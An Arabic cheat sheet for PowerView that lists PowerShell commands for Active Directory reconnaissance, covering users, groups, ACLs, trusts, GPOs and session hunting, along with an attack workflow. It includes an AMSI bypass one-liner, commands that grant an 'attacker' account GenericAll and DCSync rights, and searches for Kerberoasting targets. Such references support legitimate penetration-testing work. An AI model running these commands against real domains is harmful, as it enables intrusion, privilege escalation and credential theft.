<a id="-powerview---powershell-ad-enumeration"></a>
# ⚡ PowerView - تعداد Active Directory باستخدام PowerShell

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  PowerShell Active Directory Recon
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

يعرض الشعار اسم PowerView ووظيفته في استطلاع Active Directory باستخدام PowerShell.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو PowerView](#-what-is-powerview)
- [الإعداد](#-setup)
- [تعداد معلومات المجال](#-domain-enumeration)
- [تعداد المستخدمين](#-user-enumeration)
- [تعداد المجموعات](#-group-enumeration)
- [تعداد الحواسيب](#-computer-enumeration)
- [تعداد قوائم التحكم بالوصول](#-acl-enumeration)
- [تعداد علاقات الثقة](#-trust-enumeration)
- [تعداد كائنات نهج المجموعة GPO](#-gpo-enumeration)
- [البحث عن مواضع المستخدمين والصلاحيات](#-hunting)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-powerview"></a>
## 🎯 ما هو PowerView

**PowerView** أداة PowerShell لتعداد معلومات Active Directory ‏(AD) واستغلال إعداداته:

- 🔍 **التعداد** - المستخدمون والمجموعات والحواسيب وكائنات نهج المجموعة (GPO)
- 🔐 **قوائم التحكم بالوصول (ACL)** - العثور على صلاحيات مضبوطة بصورة غير سليمة
- 🌐 **علاقات الثقة** - رسم العلاقات بين المجالات
- 🎯 **تحديد مواضع المستخدمين** - العثور على الأجهزة التي سجلوا الدخول إليها

---

<a id="-setup"></a>
## 🚀 الإعداد

<a id="download-powerview"></a>
### تنزيل PowerView

> **ملاحظة إصدار:** مستودع [PowerSploit الأصلي](https://github.com/PowerShellMafia/PowerSploit) مؤرشف منذ 2021؛ الأمثلة تاريخية وقد تختلف الفروع. [SharpHound](https://github.com/SpecterOps/SharpHound) مجمّع بيانات C# خاص بـ BloodHound؛ لا تفترض أن عبارتي الأصل أدناه تعنيان تضمين PowerView في كل إصدار حديث منه.

```powershell
# من PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# من SharpHound
# ملف PowerView.ps1 مرفق مع BloodHound
```

<a id="import-module"></a>
### استيراد الوحدة

> **توضيح:** يؤثر النطاق `Process` في جلسة PowerShell الحالية فقط، ولا يتجاوز سياسة مفروضة عبر Group Policy. [توثيق Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy).

```powershell
# تجاوز سياسة التنفيذ
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# الاستيراد
Import-Module .\PowerView.ps1

# أو تحميل التعريفات في النطاق الحالي (Dot sourcing)
. .\PowerView.ps1
```

<a id="amsi-bypass-if-needed"></a>
### تجاوز AMSI (عند الحاجة)

> **تنبيه توافق:** يستخدم المثال انعكاسا برمجيا للوصول إلى تفاصيل داخلية، وهو مثال تاريخي لا يضمن تجاوز الحماية في الإصدارات الحالية. AMSI واجهة فحص مستقلة عن سياسة تنفيذ السكربتات؛ راجع [تعريف Microsoft لـ AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). بقي الكود الأصلي دون تعديل.

```powershell
# تجاوز بسيط
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

<a id="-domain-enumeration"></a>
## 🏢 تعداد معلومات المجال

<a id="basic-domain-info"></a>
### معلومات المجال الأساسية

```powershell
# الحصول على معلومات المجال
Get-Domain

# الحصول على معرّف أمان المجال SID
Get-DomainSID

# الحصول على سياسة المجال
Get-DomainPolicy

# الحصول على وحدات التحكم بالمجال
Get-DomainController
Get-DomainController -Domain other.domain.local

# الحصول على معلومات الغابة
Get-Forest
Get-ForestDomain
```

<a id="domain-policy"></a>
### سياسة المجال

```powershell
# سياسة كلمات المرور
(Get-DomainPolicy)."SystemAccess"

# سياسة Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

<a id="-user-enumeration"></a>
## 👤 تعداد المستخدمين

<a id="list-users"></a>
### عرض المستخدمين

```powershell
# جميع المستخدمين
Get-DomainUser

# مستخدم محدد
Get-DomainUser -Identity admin

# خصائص المستخدم
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# مستخدمون لديهم وصف
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

<a id="find-interesting-users"></a>
### العثور على مستخدمين جديرين بالفحص

```powershell
# مستخدمون لديهم SPN (قابلون لفحص تذاكر الخدمات عبر Kerberoasting)
Get-DomainUser -SPN

# مستخدمون دون اشتراط المصادقة المسبقة (AS-REP)
Get-DomainUser -PreauthNotRequired

# مستخدمون لديهم adminCount (محميون)
Get-DomainUser -AdminCount

# مستخدمون يتضمن وصفهم كلمات مرور
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

<a id="user-sessions"></a>
### جلسات المستخدمين

```powershell
# مواضع تسجيل دخول المستخدم
Find-DomainUserLocation -UserIdentity admin

# العثور على مستخدمين لديهم وصول بصلاحيات مسؤول
Find-LocalAdminAccess
```

---

<a id="-group-enumeration"></a>
## 👥 تعداد المجموعات

<a id="list-groups"></a>
### عرض المجموعات

```powershell
# جميع المجموعات
Get-DomainGroup

# مجموعة محددة
Get-DomainGroup -Identity "Domain Admins"

# أعضاء المجموعة
Get-DomainGroupMember -Identity "Domain Admins"

# الأعضاء بما يشمل المجموعات المتداخلة
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

<a id="important-groups"></a>
### مجموعات مهمة

```powershell
# مسؤولو المجال (Domain Admins)
Get-DomainGroupMember -Identity "Domain Admins"

# مسؤولو المؤسسة (Enterprise Admins)
Get-DomainGroupMember -Identity "Enterprise Admins"

# المسؤولون (Administrators)
Get-DomainGroupMember -Identity "Administrators"

# العثور على المجموعات التي ينتمي إليها المستخدم
Get-DomainGroup -UserName admin
```

<a id="local-groups"></a>
### المجموعات المحلية

```powershell
# المسؤولون المحليون على جهاز
Get-NetLocalGroupMember -ComputerName server01

# المسؤولون المحليون على جميع الأجهزة
Find-DomainLocalGroupMember -GroupName Administrators
```

---

<a id="-computer-enumeration"></a>
## 💻 تعداد الحواسيب

<a id="list-computers"></a>
### عرض الحواسيب

```powershell
# جميع الحواسيب
Get-DomainComputer

# حاسوب محدد
Get-DomainComputer -Identity server01

# الخصائص
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# حواسيب ذات تفويض غير مقيد
Get-DomainComputer -Unconstrained
```

<a id="find-targets"></a>
### العثور على الأهداف

```powershell
# وحدات التحكم بالمجال
Get-DomainController

# الخوادم
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# نظام تشغيل قديم
Get-DomainComputer -OperatingSystem "*2008*"
```

<a id="shares"></a>
### المشاركات

> **تصحيح:** يتحقق `-CheckShareAccess` من إمكانية **القراءة**، ولا يثبت إمكانية الكتابة كما يوحي تعليق الأصل. [مصدر PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
# العثور على المشاركات
Find-DomainShare

# مشاركات قابلة للكتابة
Find-DomainShare -CheckShareAccess

# ملفات جديرة بالفحص داخل المشاركات
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

<a id="-acl-enumeration"></a>
## 🔐 تعداد قوائم التحكم بالوصول

<a id="basic-acl"></a>
### الاستعلام الأساسي عن ACL

```powershell
# قائمة ACL لمستخدم
Get-DomainObjectAcl -Identity admin

# تحويل معرّفات GUID إلى أسماء مفهومة
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# صلاحيات محددة
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

<a id="find-interesting-acls"></a>
### العثور على قوائم ACL جديرة بالفحص

```powershell
# صلاحية GenericAll على مستخدم
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# صلاحية WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# صلاحية WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

<a id="dcsync-rights"></a>
### صلاحيات DCSync

> **توضيح:** مرشح الأصل الواسع يعرض مؤشرات أولية، ولا يثبت وحده امتلاك حساب معين صلاحيات DCSync الفعلية؛ يلزم تقييم الحقوق على الكائن الصحيح وهوية صاحبها. تميز Microsoft بين [حق نسخ التغييرات](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes) و[حق نسخ بيانات المجال السرية](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all).

```powershell
# العثور على صلاحيات DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

<a id="modify-acl"></a>
### تعديل قائمة ACL

```powershell
# منح مستخدم صلاحية GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# إضافة صلاحيات DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

<a id="-trust-enumeration"></a>
## 🤝 تعداد علاقات الثقة

<a id="domain-trusts"></a>
### علاقات الثقة بين المجالات

```powershell
# الحصول على علاقات الثقة
Get-DomainTrust

# جميع علاقات الثقة
Get-DomainTrust -Domain domain.local

# رسم جميع علاقات الثقة
Get-DomainTrustMapping
```

<a id="forest-trusts"></a>
### علاقات الثقة بين الغابات

```powershell
# علاقات الثقة بين الغابات
Get-ForestTrust

# مجالات الغابة
Get-ForestDomain
```

<a id="trust-types"></a>
### أنواع علاقات الثقة

| نوع الثقة | الاتجاه | الوصف |
| ------------ | ----------- | ------------- |
| ثقة متبادلة | ثنائية الاتجاه | يثق كل مجال بالمجال الآخر |
| ثقة واردة (Inbound) | أحادية الاتجاه | يثق المجال الآخر بمجالنا |
| ثقة صادرة (Outbound) | أحادية الاتجاه | يثق مجالنا بالمجال الآخر |

---

<a id="-gpo-enumeration"></a>
## 📜 تعداد كائنات نهج المجموعة GPO

<a id="list-gpos"></a>
### عرض كائنات GPO

> **تصحيح:** يستعلم `-ComputerIdentity server01` عن GPO المطبقة على **الحاسوب**، رغم وصف تعليق الأصل له بأنه استعلام عن OU. [تعريف المعامل](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
# جميع كائنات GPO
Get-DomainGPO

# كائن GPO بحسب الاسم
Get-DomainGPO -Identity "Default Domain Policy"

# كائنات GPO على وحدة تنظيمية OU محددة
Get-DomainGPO -ComputerIdentity server01
```

<a id="find-gpo-permissions"></a>
### العثور على صلاحيات GPO

مرشح الحقوق التالي لا يحدد هوية المستخدم؛ طابق نتائج ACL مع صاحب الحق وصلاحياته الفعلية قبل استنتاج أنه يستطيع التعديل.

```powershell
# كائن GPO يستطيع المستخدم تعديله
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

<a id="gpo-locations"></a>
### مواضع تطبيق GPO

```powershell
# الوحدات التنظيمية التي يطبق عليها GPO
Get-DomainOU -GPLink "{GPO-GUID}"

# كائنات GPO على حاسوب محدد
Get-DomainGPO -ComputerIdentity "server01"
```

---

<a id="-hunting"></a>
## 🎯 البحث عن مواضع المستخدمين والصلاحيات

<a id="find-admin-access"></a>
### العثور على وصول بصلاحيات مسؤول

> **ملاحظة توافق:** يعرّف المصدر الأصلي `-ComputerName` ولا يعرّف `-ComputerFile` في `Find-LocalAdminAccess`؛ أبقي المثال القديم أدناه للمقارنة. [تعريف الدالة](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
# أين نملك صلاحيات مسؤول محلي؟
Find-LocalAdminAccess

# باستخدام خيوط تنفيذ متعددة
Find-LocalAdminAccess -Threads 10

# على حواسيب محددة
Find-LocalAdminAccess -ComputerFile computers.txt
```

<a id="find-user-locations"></a>
### العثور على مواضع المستخدمين

```powershell
# أين سجل المستخدم الدخول؟
Find-DomainUserLocation

# مستخدم محدد
Find-DomainUserLocation -UserIdentity admin

# الحواسيب التي نملك وصولا إليها فقط
Find-DomainUserLocation -CheckAccess
```

<a id="find-sessions"></a>
### العثور على الجلسات

```powershell
# الجلسات على الجهاز
Get-NetSession -ComputerName dc01

# المستخدمون الذين سجلوا الدخول
Get-NetLoggedon -ComputerName server01

# جلسات RDP
Get-NetRDPSession -ComputerName server01
```

<a id="hunt-specific-users"></a>
### البحث عن مستخدمين محددين

في المصدر الأصلي، `Invoke-UserHunter` اسم بديل لـ `Find-DomainUserLocation`، و`-UserName` في `Get-DomainGroup` اسم بديل لـ `-MemberIdentity`. تعتمد هذه الأسماء على الفرع المحمّل. [تعريف الأسماء البديلة](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
# العثور على مسؤولي المجال
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# التحقق من مواضع تسجيل دخولهم
Invoke-UserHunter

# وضع التخفي
Invoke-UserHunter -Stealth
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### أوامر أساسية

| الأمر | الوصف |
| --------- | ------------- |
| `Get-Domain` | معلومات المجال |
| `Get-DomainUser` | عرض المستخدمين |
| `Get-DomainGroup` | عرض المجموعات |
| `Get-DomainComputer` | عرض الحواسيب |
| `Get-DomainController` | عرض وحدات التحكم بالمجال |
| `Get-DomainTrust` | عرض علاقات الثقة |
| `Get-DomainGPO` | عرض كائنات GPO |
| `Find-LocalAdminAccess` | العثور على وصول بصلاحيات مسؤول |
| `Find-DomainUserLocation` | العثور على جلسات المستخدمين |

<a id="kerberos-targets"></a>
### أهداف Kerberos

| الأمر | الوصف |
| --------- | ------------- |
| `Get-DomainUser -SPN` | حسابات لها تذاكر خدمات يمكن فحص كلمات مرورها (Kerberoasting) |
| `Get-DomainUser -PreauthNotRequired` | حسابات دون اشتراط المصادقة المسبقة (AS-REP Roasting) |
| `Get-DomainComputer -Unconstrained` | تفويض غير مقيد (Unconstrained delegation) |

<a id="common-filters"></a>
### مرشحات شائعة

```powershell
# الترشيح بحسب الخاصية
Get-DomainUser -Properties samaccountname,description

# مرشح LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# شرط Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

<a id="attack-workflow"></a>
### خطوات الهجوم

```powershell
# 1. الاستيراد
Import-Module .\PowerView.ps1

# 2. تعداد معلومات المجال
Get-Domain
Get-DomainController

# 3. العثور على المستخدمين
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. العثور على وصول بصلاحيات مسؤول
Find-LocalAdminAccess

# 5. تحديد مواضع المستخدمين
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. فحص قوائم ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

<a id="-resources"></a>
## 📚 المصادر

- [مستودع PowerView على GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [مدونة HarmJ0y](https://blog.harmj0y.net/)
- [ورقة PowerView المرجعية](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [BloodHound](../../BloodHound/translations/README.ar.md)
- [PowerShell](../../PowerShell/translations/README.ar.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)

---

<p align="center">
  <b>⚡ استطلاع Active Directory باستخدام PowerShell!</b><br>
  <i>PowerView - إحدى أدوات تعداد Active Directory الرائدة</i>
</p>
